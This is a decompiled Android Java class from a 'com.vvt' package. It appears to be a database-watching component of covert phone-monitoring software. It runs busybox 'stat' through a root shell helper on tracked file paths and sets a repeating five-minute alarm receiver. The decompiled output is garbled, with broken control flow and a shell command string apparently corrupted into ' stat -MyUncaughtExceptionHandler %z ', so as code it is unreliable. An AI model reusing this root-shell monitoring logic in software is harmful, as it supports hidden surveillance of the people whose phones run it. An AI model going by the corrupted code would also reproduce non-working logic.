package com.vvt.n.a;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.PowerManager.WakeLock;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.TimeZone;

public class c
  implements b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  private e e;
  private Hashtable f;
  private Context g;
  private String h;
  private PowerManager.WakeLock i;
  private int j = 300;
  private boolean k = false;
  private String l = "";
  private Runnable m;
  
  public c(String paramString1, Context paramContext, String paramString2)
  {
    Object localObject = new com/vvt/n/a/d;
    ((d)localObject).<init>(this);
    this.m = ((Runnable)localObject);
    this.h = paramString1;
    this.g = paramContext;
    this.l = paramString2;
    localObject = new java/util/Hashtable;
    ((Hashtable)localObject).<init>();
    this.f = ((Hashtable)localObject);
  }
  
  private boolean b(String paramString)
  {
    boolean bool1 = false;
    boolean bool2 = ShellUtil.b(paramString);
    if (bool2) {
      bool1 = true;
    }
    return bool1;
  }
  
  private Date c(String paramString)
  {
    Date localDate = null;
    for (;;)
    {
      try
      {
        Object localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        Object localObject2 = j();
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject2 = " stat -MyUncaughtExceptionHandler %z ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject1 = ((StringBuilder)localObject1).append(paramString);
        localObject1 = ((StringBuilder)localObject1).toString();
        localObject1 = KMShell.a((String)localObject1);
        boolean bool1 = com.vvt.ag.b.a((String)localObject1);
        if (bool1) {
          continue;
        }
        localObject2 = new java/text/SimpleDateFormat;
        Object localObject3 = "yyyy-MM-dd HH:mm:ss.SS";
        ((SimpleDateFormat)localObject2).<init>((String)localObject3);
        localObject3 = "UTC";
        localObject3 = TimeZone.getTimeZone((String)localObject3);
        ((SimpleDateFormat)localObject2).setTimeZone((TimeZone)localObject3);
        localDate = ((SimpleDateFormat)localObject2).parse((String)localObject1);
        bool2 = a;
        if (!bool2) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = d;
        if (!bool2) {
          continue;
        }
        continue;
      }
      return localDate;
      bool2 = d;
      if (!bool2) {}
    }
  }
  
  private void g()
  {
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      Object localObject4;
      Object localObject5;
      synchronized (this.f)
      {
        Object localObject1 = this.f;
        Enumeration localEnumeration = ((Hashtable)localObject1).keys();
        boolean bool2 = false;
        localObject4 = null;
        if (localEnumeration == null) {
          break label294;
        }
        bool1 = localEnumeration.hasMoreElements();
        if (!bool1) {
          break label302;
        }
        boolean bool3 = false;
        localObject5 = null;
        localObject1 = localEnumeration.nextElement();
        localObject1 = (String)localObject1;
        Object localObject6 = this.f;
        localObject6 = ((Hashtable)localObject6).get(localObject1);
        localObject6 = (f)localObject6;
        boolean bool4 = localObject6 instanceof h;
        if (bool4)
        {
          bool3 = b((String)localObject1);
          localObject5 = localObject1;
          bool1 = bool3;
          if (bool1)
          {
            localObject1 = c((String)localObject5);
            bool2 = a;
            if (bool2) {}
            ((f)localObject6).a((Date)localObject1);
            localObject4 = localObject5;
          }
        }
        else
        {
          bool4 = localObject6 instanceof com.vvt.n.a.e.a;
          if (bool4)
          {
            localObject4 = this.h;
            String str1 = j();
            String str2 = this.l;
            localObject4 = com.vvt.n.a.e.b.a((String)localObject1, (String)localObject4, str1, str2);
            bool1 = a;
            if (bool1) {}
            bool1 = com.vvt.ag.b.a((String)localObject4);
            if (bool1) {
              break label320;
            }
            bool1 = true;
            localObject5 = localObject4;
            continue;
          }
          bool4 = localObject6 instanceof com.vvt.n.a.a.b;
          if (!bool4) {
            break label320;
          }
          bool4 = b((String)localObject1);
          if (!bool4) {
            break label320;
          }
          localObject6 = (com.vvt.n.a.a.b)localObject6;
          localObject6 = ((com.vvt.n.a.a.b)localObject6).c();
          if (localObject6 == null) {
            continue;
          }
          ((g)localObject6).b((String)localObject1);
        }
      }
      bool1 = c;
      if (bool1)
      {
        localObject4 = localObject5;
        continue;
        label294:
        bool1 = c;
        if (bool1) {}
        label302:
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject4 = localObject5;
        continue;
        label320:
        bool1 = false;
        Object localObject3 = null;
        localObject5 = localObject4;
      }
    }
  }
  
  private void h()
  {
    boolean bool = a;
    if (bool) {}
    AlarmManager localAlarmManager = (AlarmManager)this.g.getSystemService("alarm");
    Object localObject1 = new android/content/IntentFilter;
    ((IntentFilter)localObject1).<init>("com.vvt.database.monitor.AlarmReceiver");
    Object localObject2 = this.e;
    if (localObject2 == null)
    {
      localObject2 = new com/vvt/n/a/e;
      n = 0;
      locale = null;
      ((e)localObject2).<init>(this, null);
      this.e = ((e)localObject2);
    }
    localObject2 = this.g;
    e locale = this.e;
    ((Context)localObject2).registerReceiver(locale, (IntentFilter)localObject1);
    localObject1 = new android/content/Intent;
    ((Intent)localObject1).<init>("com.vvt.database.monitor.AlarmReceiver");
    localObject2 = this.g;
    PendingIntent localPendingIntent = PendingIntent.getBroadcast((Context)localObject2, 0, (Intent)localObject1, 0);
    long l1 = System.currentTimeMillis();
    long l2 = this.j * 1000;
    l1 += l2;
    int n = this.j * 1000;
    l2 = n;
    localAlarmManager.setRepeating(0, l1, l2, localPendingIntent);
    bool = a;
    if (bool) {}
  }
  
  private Date i()
  {
    Calendar localCalendar = Calendar.getInstance(TimeZone.getTimeZone("UTC"));
    Date localDate = new java/util/Date;
    localDate.<init>();
    localCalendar.setTime(localDate);
    localCalendar.add(12, -1);
    return localCalendar.getTime();
  }
  
  private String j()
  {
    return p.a(this.h, "busybox");
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.k;
    if (bool) {
      b();
    }
    g();
    h();
    this.k = true;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    synchronized (this.f)
    {
      bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        Hashtable localHashtable2 = this.f;
        bool = localHashtable2.containsKey(paramString);
        if (!bool) {
          break label81;
        }
        localHashtable2 = this.f;
        localHashtable2.remove(paramString);
        bool = a;
        if (!bool) {}
      }
      label81:
      do
      {
        bool = a;
        if (bool) {}
        return;
        bool = c;
      } while (!bool);
    }
  }
  
  public void a(String paramString, a parama)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    synchronized (this.f)
    {
      bool1 = com.vvt.ag.b.a(paramString);
      if (!bool1)
      {
        Object localObject1 = this.f;
        bool1 = ((Hashtable)localObject1).containsKey(paramString);
        if (!bool1)
        {
          localObject1 = new com/vvt/n/a/h;
          ((h)localObject1).<init>();
          ((h)localObject1).a(parama);
          ((h)localObject1).a(paramString);
          Object localObject3 = this.f;
          ((Hashtable)localObject3).put(paramString, localObject1);
          boolean bool2 = b(paramString);
          if (bool2)
          {
            localObject3 = c(paramString);
            boolean bool3 = a;
            if (bool3) {}
            ((h)localObject1).a((Date)localObject3);
          }
        }
      }
      do
      {
        bool1 = a;
        if (bool1) {}
        return;
        bool1 = d;
      } while (!bool1);
    }
  }
  
  public void a(String paramString, g paramg)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    synchronized (this.f)
    {
      bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        Object localObject1 = this.f;
        bool = ((Hashtable)localObject1).containsKey(paramString);
        if (!bool)
        {
          localObject1 = new com/vvt/n/a/a/b;
          ((com.vvt.n.a.a.b)localObject1).<init>();
          ((com.vvt.n.a.a.b)localObject1).a(paramg);
          ((com.vvt.n.a.a.b)localObject1).a(paramString);
          Hashtable localHashtable2 = this.f;
          localHashtable2.put(paramString, localObject1);
        }
      }
      do
      {
        bool = a;
        if (bool) {}
        return;
        bool = d;
      } while (!bool);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.k;
    if (bool)
    {
      Object localObject1 = this.e;
      if (localObject1 != null)
      {
        localObject1 = this.g;
        localObject2 = this.e;
        ((Context)localObject1).unregisterReceiver((BroadcastReceiver)localObject2);
        bool = false;
        localObject1 = null;
        this.e = null;
      }
      localObject1 = (AlarmManager)this.g.getSystemService("alarm");
      Object localObject2 = new android/content/Intent;
      ((Intent)localObject2).<init>("com.vvt.database.monitor.AlarmReceiver");
      Context localContext = this.g;
      localObject2 = PendingIntent.getBroadcast(localContext, 0, (Intent)localObject2, 0);
      ((AlarmManager)localObject1).cancel((PendingIntent)localObject2);
      this.k = false;
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString, a parama)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    synchronized (this.f)
    {
      bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        Object localObject1 = this.f;
        bool = ((Hashtable)localObject1).containsKey(paramString);
        if (!bool)
        {
          localObject1 = new com/vvt/n/a/e/a;
          ((com.vvt.n.a.e.a)localObject1).<init>();
          ((com.vvt.n.a.e.a)localObject1).a(parama);
          ((com.vvt.n.a.e.a)localObject1).a(paramString);
          Hashtable localHashtable2 = this.f;
          localHashtable2.put(paramString, localObject1);
        }
      }
      do
      {
        bool = a;
        if (bool) {}
        return;
        bool = d;
      } while (!bool);
    }
  }
  
  public void c(String paramString, a parama)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    synchronized (this.f)
    {
      bool = com.vvt.ag.b.a(paramString);
      if (!bool)
      {
        Object localObject1 = this.f;
        bool = ((Hashtable)localObject1).containsKey(paramString);
        if (!bool)
        {
          localObject1 = new com/vvt/n/a/b/a;
          ((com.vvt.n.a.b.a)localObject1).<init>();
          ((com.vvt.n.a.b.a)localObject1).a(parama);
          ((com.vvt.n.a.b.a)localObject1).a(paramString);
          Hashtable localHashtable2 = this.f;
          localHashtable2.put(paramString, localObject1);
        }
      }
      do
      {
        bool = a;
        if (bool) {}
        return;
        bool = d;
      } while (!bool);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */